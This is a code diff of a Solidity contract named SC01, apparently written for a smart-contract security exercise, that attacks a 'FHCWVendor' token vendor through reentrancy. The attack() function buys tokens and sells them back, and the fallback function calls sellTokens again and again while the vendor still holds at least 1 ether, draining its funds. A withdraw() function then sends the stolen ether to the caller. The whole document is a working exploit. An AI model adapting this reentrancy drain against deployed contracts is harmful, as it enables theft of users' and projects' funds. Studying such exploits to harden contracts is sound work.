@@ -6,28 +6,36 @@ import "../FHCWVendor.sol";
 
 contract SC01 {
     FHCWVendor public vendor;
-    address public owner;
-    uint256 private tokensToSell;
+    uint256 private constant ethFor1000 = 1 ether;
+    uint256 private constant tokensToSell = 1000;
 
     constructor(address payable _vendorAddress) {
         vendor = FHCWVendor(_vendorAddress);
-        tokensToSell = 100;
-        owner = msg.sender;
     }
 
     fallback() external payable {
-        require(address(vendor).balance >= (tokensToSell / 1000) * (10 ** 18) + (500 gwei), "Attack over");
-        console.log("Remaining balance: ", address(vendor).balance);
-        console.log("Fallback called");
-        vendor.sellTokens(tokensToSell);
+        if (address(vendor).balance >= ethFor1000) {
+            console.log("Remaining balance: ", address(vendor).balance);
+            vendor.sellTokens(tokensToSell);
+        } else {
+            console.log("We are done");
+        }
     }
 
-    function attack() public payable {
+    function attack() external payable {        
         console.log("Attack Value sent: ", msg.value);
-        console.log("Attack Limit: ", (tokensToSell / 1000) * (10 ** 18) + (500 gwei));
-
         require(msg.value >= 1 ether, "1 or more ether is needed to attack");
+
+        uint256 sellAmount = tokensToSell * (msg.value / 10 ** 18);
+
+        console.log("Attack deposited: ", msg.value / 10 ** 18);
         vendor.buyTokens{value: msg.value}();
-        vendor.sellTokens(tokensToSell);
+        console.log("Attacks sells: ", sellAmount);
+        vendor.sellTokens(sellAmount);
+    }
+
+    function withdraw() public {
+        (bool rec,) = msg.sender.call{value: address(this).balance}("");
+        require(rec, "Couldn't transfer ETH");
     }
 }
